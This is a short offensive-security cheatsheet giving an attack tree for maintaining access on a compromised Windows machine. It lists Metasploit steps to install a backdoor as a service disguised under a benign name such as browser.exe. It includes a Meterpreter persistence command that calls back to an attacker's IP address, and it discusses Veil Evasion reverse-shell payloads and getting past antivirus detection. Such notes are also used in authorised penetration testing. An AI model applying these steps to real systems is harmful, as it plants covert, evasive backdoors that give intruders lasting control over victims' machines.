# Maintaining access on Windows

## Attack tree

```text
1 Maintain access on Windows
    1.1 In meterpreter background the current basic shell (AND)
    1.2 > use exploit/windows/local/persistence (AND)
    1.3 Set EXE_NAME to something less suspicious (like browser.exe) (AND)
    1.4 Set SESSION to the id of the basic shell just put in the background (AND)
    1.5 > show advanced
    1.6 Inject backdoor as a service with > set EXE::Custom [backdoor location] (/var/www/html/evil-files/backdoor.exe) (AND)
    1.7 > exploit
    1.8 Store the Meterpreter RC_file path for cleanup later
```

## Notes

### Problems

* Using Veil Evasion's `rev_http_service` and `rev_tcp_service` can be used instead of a backdoor, or uploaded from meterpreter. This does not always work.
* Using Meterpreter's persistence module (`> run persistence -U -i 20 -p 80 -r [IP address]`) is detectable by AV.
* A combination of the two solves these problems.

## Cheatsheets

* [Windows post exploitation enumeration](cheatsheets:docs/enumeration/windows-post)
* [Offensive security: Meterpreter Basic Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
* [Metasploit documentation](https://docs.metasploit.com/)